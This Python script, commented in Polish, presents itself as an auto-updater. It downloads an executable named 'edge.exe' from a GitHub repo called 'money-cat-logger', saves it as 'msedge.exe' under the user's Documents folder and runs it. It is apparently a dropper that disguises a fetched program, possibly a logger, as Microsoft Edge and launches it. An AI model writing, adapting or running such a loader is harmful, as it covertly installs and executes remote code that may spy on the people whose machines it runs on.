import os
import requests
import shutil
import subprocess

# KONFIGURACJA GITHUBA
GITHUB_USER = "xfendi"  # Zmień na swój GitHub username
GITHUB_REPO = "money-cat-logger"  # Zmień na nazwę repo
TOKEN = None  # Jeśli repo jest prywatne, wstaw tu token GitHub
HEADERS = {"Authorization": f"token {TOKEN}"} if TOKEN else {}

# URL plików w repozytorium
VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/version.txt"
RELEASES_API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/releases/latest"

# Ścieżki do lokalnych folderów
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
local_path = os.path.join(documents_path, "local")  
data_path = os.path.join(local_path, "data")  

# Lokalne pliki
LOCAL_VERSION_FILE = os.path.join(data_path, "version.txt")
LOCAL_EXE_FILE = os.path.join(data_path, "msedge.exe")

# Tworzenie folderów, jeśli nie istnieją
os.makedirs(data_path, exist_ok=True)

def get_server_version():
    """ Pobiera wersję aplikacji z GitHub (publiczne repo) """
    response = requests.get(VERSION_URL, headers=HEADERS)
    if response.status_code == 200:
        return response.text.strip()
    else:
        print("❌ Błąd pobierania numeru wersji.")
        return None

def get_download_url():
    """ Pobiera URL najnowszej wersji .exe z GitHub Releases """
    response = requests.get(RELEASES_API_URL, headers=HEADERS)
    if response.status_code == 200:
        release_data = response.json()
        for asset in release_data.get("assets", []):
            if asset["name"] == "edge.exe":
                return asset["browser_download_url"]
    print("❌ Nie znaleziono pliku .exe w Releases.")
    return None

def download_new_version():
    """ Pobiera nową wersję aplikacji i zapisuje do lokalnego katalogu """
    download_url = get_download_url()
    if not download_url:
        return
    
    print("⬇️ Pobieranie nowej wersji...")
    response = requests.get(download_url, stream=True)
    if response.status_code == 200:
        with open(LOCAL_EXE_FILE, 'wb') as file:
            shutil.copyfileobj(response.raw, file)
        print("✅ Nowa wersja pobrana!")
    else:
        print("❌ Błąd pobierania pliku .exe.")

def run_exe():
    """ Uruchamia pobrany plik .exe """
    try:
        subprocess.run([LOCAL_EXE_FILE], check=True)
        print("✅ Aplikacja uruchomiona!")
    except subprocess.CalledProcessError as e:
        print(f"❌ Błąd uruchamiania aplikacji: {e}")

def check_for_update():
    """ Sprawdza, czy plik .exe istnieje, jeśli nie to pobiera najnowszą wersję """
    
    # Jeśli plik exe nie istnieje, pobieramy nową wersję
    if not os.path.exists(LOCAL_EXE_FILE):
        print("❌ Plik .exe nie znaleziony! Pobieranie najnowszej wersji...")
        download_new_version()
        return
    
    # Sprawdzamy wersję pliku
    local_version = "0.0.0"
    if os.path.exists(LOCAL_VERSION_FILE):
        with open(LOCAL_VERSION_FILE, 'r') as f:
            local_version = f.read().strip()
    
    server_version = get_server_version()
    if server_version and server_version > local_version:
        print(f"🚀 Nowa wersja dostępna! Lokalna: {local_version}, Serwerowa: {server_version}")
        download_new_version()
        with open(LOCAL_VERSION_FILE, 'w') as f:
            f.write(server_version)
    else:
        print("✅ Masz najnowszą wersję!")

    # Po pobraniu najnowszej wersji uruchamiamy plik
    run_exe()

if __name__ == "__main__":
    check_for_update()
